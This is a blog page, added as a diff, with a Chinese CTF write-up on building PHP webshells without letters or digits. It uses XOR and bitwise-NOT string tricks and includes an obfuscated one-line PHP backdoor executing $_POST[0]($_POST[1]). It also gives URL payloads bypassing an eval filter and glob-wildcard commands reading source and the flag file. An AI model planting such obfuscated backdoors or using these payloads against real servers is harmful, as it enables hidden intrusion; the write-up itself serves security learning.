@@ -1,0 +1,1229 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>无字母数字webshell - 明月归的小站</title>
+  
+    <meta name="keywords" content="web,ctf,webshell">
+  
+
+  
+    <meta name="description" content="本篇博客介绍了构造无字母数字webshell的一些方法！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">无字母数字webshell</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2019/10/16/nowords-webshell/">
+      无字母数字webshell
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2019年10月16日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客介绍了构造无字母数字webshell的一些方法！</p>
+<a id="more"></a>
+<h2 id="一道有意思的题"><a href="#一道有意思的题" class="headerlink" title="一道有意思的题"></a>一道有意思的题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>分析代码可知只要执行getFlag()函数应该就可以得到flag了</p>
+<p>但对code的长度限制&lt;40,并且code不能有数字和大小写字母</p>
+<h3 id="方式1-异或运算"><a href="#方式1-异或运算" class="headerlink" title="方式1(异或运算)"></a>方式1(异或运算)</h3><p>先解释下异或运算</p>
+<p>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
+<p><strong>举个例子：</strong></p>
+<pre><code>A的ASCII值是65，对应的二进制值是01000001
+
+?的ASCII值是63，对应的二进制值是00111111</code></pre>
+<p>异或的二进制的值是01111110，对应的ASCII值是126，对应的字符串的值就是~了</p>
+<p>我们都知道，PHP是弱类型的语言，也就是说在PHP中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于PHP弱类型的这个特点，我们对PHP的变类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function B()&#123;</span><br><span class="line">        echo &quot;Hello Angel_Kitty&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__&#x3D; &quot;?&quot; ^ &quot;&#125;&quot;;</span><br><span class="line">    $__();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我们一起来分析一下上面这段代码：</p>
+<pre><code>$_++;这行代码的意思是对变量名为&quot;_&quot;的变量进行自增操作，在PHP中未定义的变量默认值为null,null==false==0,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。
+
+$__=&quot;?&quot; ^ &quot;&#125;&quot;;对字符”?”和”&#125;”进行异或运算，得到结果B赋给变量名为”__”(两个下划线)的变量
+
+$ __ ();通过上面的赋值操作，变量$__的值为B，所以这行可以看作是B(),在PHP中,这行代码表示调用函数B,所以执行结果为Hello Angel_Kitty。在PHP中，我们可以将字符串当作函数来处理。</code></pre>
+<p>下面是个非常简单的非数字字母的PHP后门：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    @$_++; &#x2F;&#x2F; $_ &#x3D; 1</span><br><span class="line">    $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _</span><br><span class="line">    $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P</span><br><span class="line">    $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO</span><br><span class="line">    $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS</span><br><span class="line">    $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>_POST的拼接可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：</p>
+<pre><code>$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);
+或者
+$__=&quot;#./|&#123;&quot;^&quot;|~`//&quot;;</code></pre>
+<p>注意#的url编码，否则会相当于注释</p>
+<p>同样_GET也可以这样拼接</p>
+<pre><code>$__=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;</code></pre>
+<p>按照这种方法，可得payload</p>
+<pre><code>?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=getFlag
+
+?code=$_=&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();    //$_=&#39;getFlag&#39;
+
+
+?code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();</code></pre>
+<p>相当于 <code>$啊=getFlag;$啊();</code></p>
+<p>这里就不需要用 <code>&#123;&#125;</code> 了，因为取反的值直接被当作字符串赋值给了 $ 啊</p>
+<h3 id="方式2-取反运算"><a href="#方式2-取反运算" class="headerlink" title="方式2(取反运算)"></a>方式2(取反运算)</h3><p><strong>主要原理：</strong></p>
+<p>利用的是UTF-8编码的某个汉字，将其中某个字符取出来取反</p>
+<p>比如<code>&quot;和&quot;[2]</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母s</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/10/16/nowords-webshell/fadccb70-4143-49df-aa47-bc9a1af93c56.jpg"></p>
+<p><strong>举个例子：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);     &#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;        &#x2F;&#x2F;$_&#x3D;1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$_&#125;);            &#x2F;&#x2F;$____&#x3D;&#39;a&#39;</span><br><span class="line">$___&#x3D;&quot;和&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$__&#125;);</span><br><span class="line">$___&#x3D;&quot;和&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$____&#x3D;&#39;as&#39;</span><br><span class="line">$___&#x3D;&quot;的&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$_&#125;);            &#x2F;&#x2F;$____&#x3D;&#39;ass&#39;</span><br><span class="line">$___&#x3D;&quot;半&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$_&#125;);            &#x2F;&#x2F;$____&#x3D;&#39;asse&#39;</span><br><span class="line">$___&#x3D;&quot;始&quot;;</span><br><span class="line">$____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$____&#x3D;&#39;assert&#39;</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;</span><br><span class="line">$___&#x3D;&quot;俯&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_P&#39;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$__&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_PO&#39;</span><br><span class="line">$___&#x3D;&quot;次&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$_&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_POS&#39;</span><br><span class="line">$___&#x3D;&quot;站&quot;;</span><br><span class="line">$_____.&#x3D;~($___&#123;$_&#125;);        &#x2F;&#x2F;$_____&#x3D;&#39;_POST&#39;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;                    &#x2F;&#x2F;$_&#x3D;$_POST</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure>
+<p>这里也有一种简短的写法<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code>它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。</p>
+<p>那麽利用这种方式可得payload</p>
+<pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); //%_为getFlag取反然后URL编码得结果
+或
+
+?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre>
+<p>拼接出了 $_GET<a href>‘+’</a>;，传入 +=getFlag() 从而执行了函数</p>
+<p><strong>注意点：</strong></p>
+<p>php5和php7是有区别的</p>
+<p>PHP7前是不允许用<code>($a)()</code>;这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
+<h2 id="升级版"><a href="#升级版" class="headerlink" title="升级版"></a>升级版</h2><p>升级版增加了对<code>_</code>和<code>$</code>的过滤，但还是有方法绕过的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>这道题刚好是在linux系统上，并且开启了短标签</p>
+<p>在linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用<code>? * %</code>等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试：</p>
+<pre><code>???/??? =&gt; /bin/cat</code></pre>
+<p>PHP开启短标签即<code>short_open_tag=on</code>时，可以使用<code>&lt;?=$_?&gt;</code>输出变量<br>于是读源码：</p>
+<pre><code>$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;
+&quot;/bin/cat /var/www/html/index.php&quot;</code></pre>
+<p>长度超出上限，使用通配：</p>
+<pre><code>$_=/???/???%20/???/???/????/;?&gt;&lt;?=$_?&gt;</code></pre>
+<p>正则过滤了$和_,改进为：</p>
+<pre><code>?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;</code></pre>
+<p>可以读到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">    $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接读flag文件</p>
+<pre><code>?&gt;&lt;?=`/???/???%20/????`;?&gt;</code></pre>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2019/10/16/nowords-webshell/>http://www.m00nback.xyz/2019/10/16/nowords-webshell/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-20T14:34:36+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年4月20日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/webshell/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>webshell</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2019/10/16/nowords-webshell/&title=无字母数字webshell - 明月归的小站&summary=本篇博客介绍了构造无字母数字webshell的一些方法！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2019/10/16/nowords-webshell/&title=无字母数字webshell - 明月归的小站&summary=本篇博客介绍了构造无字母数字webshell的一些方法！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2019/10/16/nowords-webshell/&title=无字母数字webshell - 明月归的小站&summary=本篇博客介绍了构造无字母数字webshell的一些方法！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2019/10/16/upload-labs-wp/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>upload-labs靶场通关手册</p>
+                <p class='content'>本篇博客介绍了uploadlabs靶场通关指南！为了方便显示，这里把一句话写成phpinfo,并使用bp抓包!
+
+Pass-01考察点：本地js检验
+通关方法：
+上传webshell时将其后缀改...</p>
+              </a>
+            
+            
+              <a class='next' href='/2019/10/16/github-blog-domain/'>
+                <p class='title'>github博客优化<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>闲来无事，搞了个域名，试试把买的域名解析到博客上！
+
+
+github pages绑定自己的域名修改域名解析我是在腾讯云买的域名，阿里云配置也类似
+
+添加主机记录为子域名（不能为全部域名，这里为b...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98"><span class="toc-text">一道有意思的题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F1-%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97"><span class="toc-text">方式1(异或运算)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F2-%E5%8F%96%E5%8F%8D%E8%BF%90%E7%AE%97"><span class="toc-text">方式2(取反运算)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7%E7%89%88"><span class="toc-text">升级版</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95"><span class="toc-text">解题方法</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
